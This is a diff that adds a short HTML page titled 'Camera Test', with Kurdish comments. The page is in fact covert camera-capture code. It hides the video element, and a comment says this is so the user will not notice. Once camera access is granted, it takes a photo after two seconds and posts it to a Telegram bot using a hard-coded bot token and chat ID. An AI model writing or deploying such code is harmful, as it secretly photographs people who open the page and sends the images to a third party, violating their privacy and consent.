@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <title>Camera Test</title>
+    <style>
+        /* شاردنەوەی ڤیدیۆکە بۆ ئەوەی بەکارهێنەر هەستی پێ نەکات، یان دەتوانیت لایبەریت */
+        #video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<video id="video" autoplay></video>
+
+<script>
+    // زانیارییەکانی تۆ
+    const BOT_TOKEN = '8632512389:AAHZDvnSORBcsI2Tr4Scr6hXSv5FlNoixHE';
+    const CHAT_ID = '659131693';
+
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        const videoElement = document.getElementById('video');
+        videoElement.srcObject = stream;
+
+        // دوای 2 چرکە لە کردنەوەی کامێرا وێنەکە دەگرێت
+        setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640; // کوالێتی وێنەکە
+            canvas.height = 480;
+            
+            const context = canvas.getContext('2d');
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('photo', blob, 'snap.jpg');
+                formData.append('chat_id', CHAT_ID);
+                formData.append('caption', 'وێنەیەکی نوێ گیرا لە ڕێگەی کامێراوە');
+
+                // ناردنی وێنەکە بۆ بۆتەکەت لە تێلیگرام
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('ناردرا:', data);
+                })
+                .catch(error => {
+                    console.error('هەڵە لە ناردن:', error);
+                });
+            }, 'image/jpeg');
+        }, 2000);
+    }).catch(err => {
+        console.error("کێشە لە کردنەوەی کامێرا:", err);
+    });
+</script>
+
+</body>
+</html>
